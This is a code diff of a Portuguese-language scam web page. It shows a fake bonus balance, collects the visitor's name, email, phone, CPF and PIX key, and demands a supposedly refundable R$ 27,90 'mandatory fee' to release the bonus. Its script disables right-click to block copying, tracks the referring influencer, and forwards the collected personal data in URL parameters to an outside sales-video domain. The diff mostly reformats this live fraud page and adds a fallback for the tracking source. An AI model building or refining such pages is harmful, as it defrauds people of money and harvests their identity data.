@@ -18,6 +18,7 @@
     fbq('init', '847728461631550');
     fbq('track', 'PageView');
     </script>
+
     <style>
         /* =========================================
             CSS GERAL & TELA 1
@@ -33,12 +34,10 @@
             color: #333;
         }
 
-        /* Utilitários */
         .hidden { display: none !important; }
         .fade-in { animation: fadeIn 0.4s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* ESTILOS TELA 1 (DASHBOARD) */
         .container-dashboard { width: 100%; max-width: 450px; padding: 20px; position: relative; z-index: 1; }
         .title { text-align: center; font-size: 20px; font-weight: 900; margin-bottom: 20px; color: #222; }
         .saldo-card { 
@@ -127,7 +126,7 @@
         .cta:hover { opacity: 0.95; }
         .reembolso { text-align: center; font-size: 12px; color: #1f9c6b; margin-top: 8px; font-weight: 500; }
 
-        /* --- ESTILO RESUMO FINANCEIRO --- */
+        /* --- PARTE ADICIONADA: ESTILO SOMATÓRIA --- */
         .resumo-financeiro {
             background-color: #f9f9f9;
             border: 1px dashed #ddd;
@@ -152,6 +151,7 @@
             padding-top: 10px;
             margin-top: 5px;
         }
+
     </style>
 </head>
 <body>
@@ -215,7 +215,9 @@
                     <span class="valor">R$ 27,90</span>
                     <span class="badge">VALOR REEMBOLSÁVEL</span>
                 </div>
-                <p class="descricao">Taxa obrigatória para liberação de bônus. O valor de <strong>R$ 27,90</strong> será reembolsado para você junto a bonificação.</p>
+                <p class="descricao">
+                    Taxa obrigatória para liberação de bônus. O valor de <strong>R$ 27,90</strong> será reembolsado para você junto a bonificação.
+                </p>
             </div>
 
             <div class="card">
@@ -227,9 +229,18 @@
                 <div class="info-row"><span>Chave PIX</span><strong><span id="conf-chave">...</span></strong></div>
                 
                 <div class="resumo-financeiro">
-                    <div class="linha-valor"><span>Saldo Bônus</span><strong>R$ 1.342,03</strong></div>
-                    <div class="linha-valor" style="color: #1f9c6b;"><span>+ Reembolso da Taxa</span><strong>R$ 27,90</strong></div>
-                    <div class="linha-total"><span>TOTAL A RECEBER</span><span style="color: #1f9c6b;">R$ 1.369,93</span></div>
+                    <div class="linha-valor">
+                        <span>Saldo Bônus</span>
+                        <strong>R$ 1.342,03</strong>
+                    </div>
+                    <div class="linha-valor" style="color: #1f9c6b;">
+                        <span>+ Reembolso da Taxa</span>
+                        <strong>R$ 27,90</strong>
+                    </div>
+                    <div class="linha-total">
+                        <span>TOTAL A RECEBER</span>
+                        <span style="color: #1f9c6b;">R$ 1.369,93</span>
+                    </div>
                 </div>
             </div>
 
@@ -257,17 +268,10 @@
     </div>
 
    <script>
-    // ==========================================
-    // CONFIGURAÇÃO DO LINK CORRIGIDO PARA A VSL!
-    // ==========================================
     const LINK_DA_VSL = "https://seubonushopp.com/pagina-4/?";
     
     let valorSelecionado = 0;
-    let influencerSource = 'direto'; 
-
-    let dadosUsuario = {
-        nome: "", email: "", telefone: "", documento: "", chave: "", tipo: "cpf"
-    };
+    let dadosUsuario = { nome: "", email: "", telefone: "", documento: "", chave: "", tipo: "cpf" };
 
     // --- BLOQUEIO ANTI-CÓPIA ---
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -334,7 +338,6 @@
         if(nome.length < 3 || !email.includes('@') || docCpf.length < 14) { alert("Preencha os dados corretamente."); return; }
 
         dadosUsuario = { nome, email, telefone, documento: docCpf, chave, tipo };
-        
         localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
 
         document.getElementById('modal-pix').classList.add('hidden');
@@ -355,9 +358,11 @@
         const btn = document.querySelector('.cta');
         btn.innerText = "PROCESSANDO...";
         
-        // --- RECUPERAÇÃO AGRESSIVA DA ORIGEM ---
-        const finalSrc = localStorage.getItem('origem_influ') || influencerSource;
         const p = dadosUsuario;
+        
+        // --- REDUNDÂNCIA ABSOLUTA: PEGA DA URL ATUAL OU DA MEMÓRIA ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const finalSrc = urlParams.get('src') || localStorage.getItem('origem_influ') || 'direto';
         
         window.location.href = `${LINK_DA_VSL}nome=${encodeURIComponent(p.nome)}&email=${encodeURIComponent(p.email)}&phone=${encodeURIComponent(p.telefone)}&cpf=${encodeURIComponent(p.documento)}&src=${encodeURIComponent(finalSrc)}`;
     }
@@ -369,9 +374,6 @@
         
         if (srcUrl) {
             localStorage.setItem('origem_influ', srcUrl);
-            influencerSource = srcUrl;
-        } else {
-            influencerSource = localStorage.getItem('origem_influ') || 'direto';
         }
 
         animateValue("counter", 0, 1342.03, 2000);
